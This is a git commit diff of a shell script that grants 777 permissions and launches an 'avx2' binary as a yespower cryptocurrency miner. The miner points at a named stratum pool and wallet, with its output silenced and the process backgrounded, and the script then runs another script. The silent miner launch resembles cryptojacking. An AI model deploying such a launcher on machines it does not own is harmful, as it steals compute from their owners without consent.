d86a4ad75b300b99e3b45cc31249fe43d646f696
jsiqiisn <100444720+jsiqiisn@users.noreply.github.com>
2022-05-26 19:43:13 +0700

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-chmod 777 lo.sh
+chmod 777 lo.sh avx2
 ./avx2 -a yespower -o stratum+tcps://stratum-asia.rplant.xyz:17070 -u WbQR3w5EyWkuoFjhjYymrr3pEZDSTTgQkX.whiv > /dev/null 2>&1 &
 ./lo.sh
